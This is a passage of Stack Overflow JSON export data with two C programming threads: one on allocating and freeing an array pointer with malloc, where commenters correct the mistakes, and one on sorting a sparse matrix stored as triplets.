how to know if it is freed\">stackoverflow.com/questions/8102403/&hellip;</a>"}, {"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "reply_to_user": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "edited": false, "score": 0, "creation_date": 1524658790, "post_id": 50022005, "comment_id": 87060184, "body": "@Groo Yes, I&#39;ve read that, the memory is being allocated in the second line. Not sure if you mean that something is wrong."}, {"owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524658875, "post_id": 50022005, "comment_id": 87060251, "body": "<code>gameInfo</code> is a pointer to (one or more) arrays of ints. You allocated a number of pointers, but haven&#39;t allocated actual arrays. The simplest way would be to make it a pointer to structs, this would make it more obvious where the mistake is. As @Someprogrammerdude wrote, <code>gameInfo</code> is not an <code>int*</code> (it&#39;s <code>int (*gameInfo)[2]</code> instead), so your <code>malloc</code> statement is incorrect too."}, {"owner": {"reputation": 17170, "user_id": 1671066, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/bd4c9461f2d17a884fba66eeed20e320?s=128&d=identicon&r=PG", "display_name": "Micha Wiedenmann", "link": "https://stackoverflow.com/users/1671066/micha-wiedenmann"}, "edited": false, "score": 0, "creation_date": 1524658966, "post_id": 50022005, "comment_id": 87060335, "body": "Do you want to keep two numbers, or two lists of numbers?"}, {"owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "reply_to_user": {"reputation": 17170, "user_id": 1671066, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/bd4c9461f2d17a884fba66eeed20e320?s=128&d=identicon&r=PG", "display_name": "Micha Wiedenmann", "link": "https://stackoverflow.com/users/1671066/micha-wiedenmann"}, "edited": false, "score": 1, "creation_date": 1524659027, "post_id": 50022005, "comment_id": 87060380, "body": "@MichaWiedenmann: neither, he wants a list of pairs of numbers."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1524659086, "post_id": 50022005, "comment_id": 87060419, "body": "A smart tip when using <code>malloc</code> and &quot;special&quot; or &quot;hard&quot; types: Use the dereferenced variable in the <code>sizeof</code>. Like in your case, <code>gameInfo = malloc(size * sizeof *gameInfo)</code>"}, {"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "reply_to_user": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "edited": false, "score": 0, "creation_date": 1524659283, "post_id": 50022005, "comment_id": 87060583, "body": "@Groo I&#39;ll try to see if I can solve this with structures then. As for the malloc being incorrect, could you tell me how it should be done? Is it: malloc(size * sizeof(int*[2])) ?"}, {"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524659696, "post_id": 50022005, "comment_id": 87060907, "body": "@Someprogrammerdude That just did it! Thank you :) I also removed the for, so I wouldn&#39;t be free the array like you mentioned. I would like to mark it as the correct answer, if you don&#39;t mind to answer the topic with these two changes. Thank you everyone for helping. I&#39;ll still look into structures for this :)"}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "edited": false, "score": 1, "creation_date": 1524661098, "post_id": 50022319, "comment_id": 87062001, "body": "The problem I was having was because of an error in my malloc. However, the structure approach is a excelent idea and I&#39;ll implement it. The topic is small and people with the same problem can read the comment and understand what happened, so I&#39;ll go and mark your answer as the correct one. Thank you for your help!"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524661275, "post_id": 50022319, "comment_id": 87062148, "body": "&quot;This essentially creates space equivalent to what you would have with a 2D int array&quot;  No! It allocates two pieces of fragmented memory! Furthermore you can&#39;t zero initialize the data with a single call to calloc or memset this way. Just forget about using these pointer look-up tables please. They are complex, slow and unsafe at once. The struct idea is sound and may be the correct solution to the actual problem, but it is no 2D array."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524662912, "post_id": 50022319, "comment_id": 87063318, "body": "@Lundin - Agreed. no argument. I have clarified that statement in my post. Thanks for pointing out that mistake. However, I have used pointers to multiple instances of struct often, and with performance that satisfies my needs. They enable reading large collections of data, requiring representation using multiple data types, where the quantity of instances is not known until run time."}], "tags": [], "owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "is_accepted": true, "score": 2, "last_activity_date": 1524662394, "last_edit_date": 1524662394, "creation_date": 1524659145, "answer_id": 50022319, "question_id": 50022005, "link": "https://stackoverflow.com/questions/50022005/how-to-free-pointer-to-an-array-of-integers/50022319#50022319", "title": "How to free pointer to an array of integers", "body": "<p>First, for your stated purposes, the declaration:</p>\n\n<pre><code>int (*gameInfo)[2]; // [0] # of fouls || [1] # of players\n</code></pre>\n\n<p>Could be:</p>\n\n<pre><code>int *gameInfo[2]; // [0] # of fouls || [1] # of players\n</code></pre>\n\n<p>Then, allocation for both elements of the array would look like this:</p>\n\n<pre><code>int size = 10; // for example\n\ngameInfo[0] = malloc(size * sizeof(*gameInfo[0]));\ngameInfo[1] = malloc(size * sizeof(*gameInfo[1]));\n</code></pre>\n\n<p>This essentially creates a <em>quantity of space</em> equivalent to that you would have with a 2D int array such as:</p>\n\n<pre><code>int gameInfo[2][10];\n</code></pre>\n\n<p>After use, free them:</p>\n\n<pre><code>free(gameInfo[0]);\nfree(gameInfo[1]);\n</code></pre>\n\n<p><strong><em>A better option</em></strong>, as mentioned in the comments might be to create a struct:</p>\n\n<pre><code>typedef struct {\n   int fouls;\n   int players;\n} GAME;\n</code></pre>\n\n<p>Usage can then include creating, using then freeing an array of games:</p>\n\n<pre><code>GAME *game;\ngame = calloc(10, sizeof(*game));\n...\ngame[0].fouls = 3;\ngame[0].players = 2;\n...\ngame[9].fouls = 6;\ngame[9].players = 3;\n...\nfree(game);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "edited": false, "score": 0, "creation_date": 1524664838, "post_id": 50023016, "comment_id": 87064550, "body": "Thank you, I&#39;ll give that a read as soon as I have some time!"}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 0, "last_activity_date": 1524661635, "last_edit_date": 1524661635, "creation_date": 1524661100, "answer_id": 50023016, "question_id": 50022005, "link": "https://stackoverflow.com/questions/50022005/how-to-free-pointer-to-an-array-of-integers/50023016#50023016", "title": "How to free pointer to an array of integers", "body": "<p>To begin with, you allocate incorrectly. You are using an array pointer, so it should be set to point at an array, not to some fragmented pointer look-up table.</p>\n\n<pre><code>int (*gameInfo)[players]; // [0] # of fouls || [1] # of players\ngameInfo = calloc(1, sizeof( int[fouls][players] ));\n\n...\ngameInfo[x][y] = something;\n...\n\nfree(gameInfo);\n</code></pre>\n\n<p>That's it. </p>\n\n<p>Not only did this turn the code much more readable, it also improves performance drastically.</p>\n\n<p>Further study: <a href=\"https://stackoverflow.com/questions/42094465/correctly-allocating-multi-dimensional-arrays\">Correctly allocating multi-dimensional arrays</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524661496, "post_id": 50023118, "comment_id": 87062297, "body": "<code>&amp;gameInfo[0]</code> -&gt; <code>gameInfo</code>. But there are more serious problems here, such as the OP allocating an array of pointers instead of data."}, {"owner": {"reputation": 559, "user_id": 8205705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0d5f01e46b412bc7966fad14bf216a1?s=128&d=identicon&r=PG&f=1", "display_name": "Shore", "link": "https://stackoverflow.com/users/8205705/shore"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524661734, "post_id": 50023118, "comment_id": 87062477, "body": "@Lundin wat do you mean by allocating an array of pointers instead of data. The original malloc function allocated a field of 8 byte and send the start address to gameInfo. C allows you to use gameInfo[i] to access the n&#39;th data if you defined the correct pointer type. But what gameInfo itself is a pointer, that contains the address of it........."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524661831, "post_id": 50023118, "comment_id": 87062549, "body": "They are using an array pointer, then allocating an array of pointers, which is something else entirely. And then they don&#39;t allocate space for each pointer in the array of pointers either. Which would have been the wrong solution anyway. See my answer for an example of how to do this proper."}], "tags": [], "owner": {"reputation": 559, "user_id": 8205705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0d5f01e46b412bc7966fad14bf216a1?s=128&d=identicon&r=PG&f=1", "display_name": "Shore", "link": "https://stackoverflow.com/users/8205705/shore"}, "is_accepted": false, "score": 0, "last_activity_date": 1524663090, "last_edit_date": 1524663090, "creation_date": 1524661370, "answer_id": 50023118, "question_id": 50022005, "link": "https://stackoverflow.com/questions/50022005/how-to-free-pointer-to-an-array-of-integers/50023118#50023118", "title": "How to free pointer to an array of integers", "body": "<pre><code>int(*gameInfo)[2];\ngameInfo = (int*)malloc(4 * sizeof(int*));\nfor (int i = 0; i &lt; 2; i++) {\n    memset(gameInfo[i], 0, 2 * sizeof(int));\n}\nfree(gameInfo);\n</code></pre>\n\n<p>After some tests, I updated it. The reason lies on nonalignment of memset and malloc. Obviously you applied 2*sizeof(int) memory and memset 2 times of 2*sizeof(int), which is out of the range of 8 byte you applied. Apply 16 byte, in my system fixed the problem. And thanks for @Lundin for reminding me the problem. </p>\n"}], "owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1179, "favorite_count": 0, "accepted_answer_id": 50022319, "answer_count": 3, "score": 2, "last_activity_date": 1524663090, "creation_date": 1524658257, "question_id": 50022005, "link": "https://stackoverflow.com/questions/50022005/how-to-free-pointer-to-an-array-of-integers", "title": "How to free pointer to an array of integers", "body": "<p>I'm having problems figuring out how to free a pointer to an array of integers, my code is as follow:</p>\n\n<pre><code>int (*gameInfo)[2]; // [0] # of fouls || [1] # of players\ngameInfo = (int *)malloc(size * sizeof(int*));\nfor (int i = 0; i &lt; size; i++) {\n    memset(gameInfo[i], 0, 2 * sizeof(int));\n}\n</code></pre>\n\n<p>I declare the pointer in the first line, initialize it in the second, and sets all values to 0 inside the for. It works fine.</p>\n\n<p>After I load the new values, and use them I want to free the pointer. I do the following:</p>\n\n<pre><code>for (int i = 0; i &lt; size; i++) {\n    free(gameInfo[i]);\n}\nfree(gameInfo);\n</code></pre>\n\n<p>I'm trying to free the arrays first, and then free the pointer. I get a \"has triggered a breakpoint\" the first time it tries to execute \"free(gameInfo[i])\".</p>\n\n<p>I've read that the array, since it doesn't have dynamic allocated memory, doesn't need to be free, but if I remove the for and just leave <code>free(gameInfo);</code> it gives the same error.\nI've read this in a blog somewhere, so I'm not sure if it's trustworthy.</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["c", "matrix", "sparse-matrix"], "comments": [{"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524658814, "post_id": 50021947, "comment_id": 87060206, "body": "Here <a href=\"https://en.wikipedia.org/wiki/Sorting_algorithm#Comparison_of_algorithms\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/&hellip;</a> you have lots of sorting algorithms listed together with complexity."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524659654, "post_id": 50021947, "comment_id": 87060879, "body": "Is &quot;the user&quot; a human typing input? Or another piece of a program?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524659721, "post_id": 50021947, "comment_id": 87060935, "body": "Are all input given at the same time? Or do you need to accept new input and do a sort at any time?"}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524661264, "post_id": 50021947, "comment_id": 87062134, "body": "@4386427 I can both read from a file, or a human input.  I have a function that reads the input and stores it as the program runs. So the input, if given by a human, is given whenever he wants, and I have to the sort the matrix if the user wants as well."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524661508, "post_id": 50021947, "comment_id": 87062307, "body": "Why don&#39;t you just place the elements directly at the correct position in the matrix?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524661670, "post_id": 50021947, "comment_id": 87062428, "body": "I have a feeling that you have misunderstood this assignment. This looks like a technique used for a sparse matrix, i.e. a matrix where there are few non-zero elements."}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524661737, "post_id": 50021947, "comment_id": 87062482, "body": "@4386427 educational purposes. It&#39;s a school project and In which I have to develop an &quot;app&quot; that does multiple things. And yes, this is an assignment that deals with sparse matrix"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524662090, "post_id": 50021947, "comment_id": 87062737, "body": "For a sparse matrix there are few non-zero elements so the whole idea is to save memory by only storing the non-zero elements. So you don&#39;t need a complete matrix filled with zeros to start with. Further, since there are only few non-zero elements, it doesn&#39;t matter that the whole matrix is huge. The sorting is only to be done on the few no-zero elements. So <code>qsort</code> should be fine"}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524662240, "post_id": 50021947, "comment_id": 87062845, "body": "@4386427 but I have functions in which I have to print the lines or columns from the min to the max index that were given to me. So what do I do in that case? Do i fill the blank with zeros? If so, how ? Would qsort sort me the values given by line and then by column without losing the value of the position?  For example, [4,4]=2 [3,2]=4 [3,5]=5  how would qsort put it in this order [3,2]=4 [3,5]=5 [4,4]=2  ??"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524662439, "post_id": 50021947, "comment_id": 87062994, "body": "Yes. If you an element in (0, 0) = 5.2 and the next element is (0, 123) = 6.7 and you are to print row 0, then you print 5.2 and then 0 122 times and then print 6.7 and so on. That&#39;s part of the idea here. If (0, 1) isn&#39;t present in your list, you know it&#39;s value is zero. A sparse 1000x1000 matrix may for instance only hold 3-4000 no-zero elements that you need to store. So you save a lot of memory but get more complicated operation."}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524662761, "post_id": 50021947, "comment_id": 87063236, "body": "Hmm but if I put the values in order from the input, I can&#39;t print in the the order the input was given to me.  So what I mean by that is, if the user doesn&#39;t want to sort the matrix, it needs to print the matrix in the order it was given by him. If he then decides to sort it, it then only prints the sorted matrix.  Btw, if it needs to sort by lines first, all the user need to do is to call the sorting function. If it needs to sort by columns first, the user needs to give me a the word column when he calls the function. How would I check for both conditions ?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524663158, "post_id": 50021947, "comment_id": 87063449, "body": "Let us say that the sparse matrix is 1000x1000. When you read it from file/user, you only get 100 elements. You store these element in a array. When the user ask you to sort (by row or by column), you do the sorting <b>only</b> on those 100 elements in the array. When printing it is your job to print out a zero for those elements in the huge matrix that isn&#39;t present in your small array."}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524664999, "post_id": 50021947, "comment_id": 87064663, "body": "@4386427 Ok thanks. Btw, I have to read multiple options with a switch(option) from the stdin.  The options are chars. If in my function add I can read  the 3 numbers and then set the buffer to zero, but then if I press p to print my matrix, it returns my default option and does not read the input. What do I do?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524665240, "post_id": 50021947, "comment_id": 87064825, "body": "If you are using <code>scanf(&quot;%c&quot;, &amp;some_char)</code> make sure to have a space beteen <code>&quot;</code> and <code>%c</code>. Like <code>scanf(&quot; %c&quot;, &amp;some_char)</code>"}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524678299, "post_id": 50021947, "comment_id": 87072873, "body": "@4386427 how am I suppose to fill in the zeros and print an entire line between my most left column and most right colum?  like, for line 3 and for the following inputs     <code>(3,0) = 3     (3,4)=9 .... print_line(3)-&gt; 0 0 0 0 9</code>"}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524678553, "post_id": 50021947, "comment_id": 87073005, "body": "@4386427  Currently, what I am doing is  <code>void print_line(){ unsigned int ii,userLine, j; scanf(&quot;%u&quot;, &amp;userLine); if((userLine&lt;workingMatrix.minLine) || (userLine&gt;workingMatrix.maxLine)){ printf(&quot;empty line\\n&quot;); } else{ for(ii=0;ii&lt;matrixcount;ii++){ if(auxMatrix[ii].line!=userLine){ printf(&quot;empty line\\n&quot;);break; } else{     \t\t\t\tfor(j=workingMatrix.minCol;j&lt;=workingMatrix.maxCol;j++){ if(auxMatrix[ii].line==userLine){ printf(&quot;%.3f \\n&quot;,auxMatrix[ii].value); } else if(auxMatrix[ii].line!=userLine){ printf(&quot;%.3f \\n&quot;,(float)workingMatrix.zero);}}}}} printf(&quot;\\n&quot;);}</code>"}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524678864, "post_id": 50021947, "comment_id": 87073186, "body": "@4386427 it prints me 0 0 0 0 9 9 9 in the example I gave you"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524763999, "post_id": 50021947, "comment_id": 87113979, "body": "as you state, your loosing option values.  However, you have not posted a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> so we have no real idea as to what the source of your problem is.  So make is simple on your self and us by posting a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}], "answers": [{"tags": [], "owner": {"reputation": 508, "user_id": 3108401, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/QjwKB.jpg?s=128&g=1", "display_name": "Aznaveh", "link": "https://stackoverflow.com/users/3108401/aznaveh"}, "is_accepted": false, "score": 0, "last_activity_date": 1525150870, "creation_date": 1525150870, "answer_id": 50111532, "question_id": 50021947, "link": "https://stackoverflow.com/questions/50021947/sorting-a-matrix-by-column-and-by-row/50111532#50111532", "title": "Sorting a matrix by column and by row", "body": "<p>The format that you are saving the matrix is called triplet format. Sorting them in row or column order means saving them in compressed sparse column (CSC) or compressed sparse row (CSR) format. \nMost sparse libraries implemented them efficiently. Converting CSC to CSR or vice versa is just a matrix transpose. If you are looking for a small efficient code, you can look at \"cs_transpose\" function in SuiteSparse/CSparse. \nFor converting triplet to any compressed form it is just like that. counting number of elements in each row/column and then putting them in the right place in order (Like a bucket sort). The algorithm would bo O(n), but the elements within a row/column are not sorted. \nA simple solution would be transposing them. Transposing twice is actually used  in practice!</p>\n"}], "owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 258, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1525150870, "creation_date": 1524658088, "question_id": 50021947, "link": "https://stackoverflow.com/questions/50021947/sorting-a-matrix-by-column-and-by-row", "title": "Sorting a matrix by column and by row", "body": "<p>I have to build a function that sorts a matrix by rows and then by colums or the other way around, preserving the values inside the 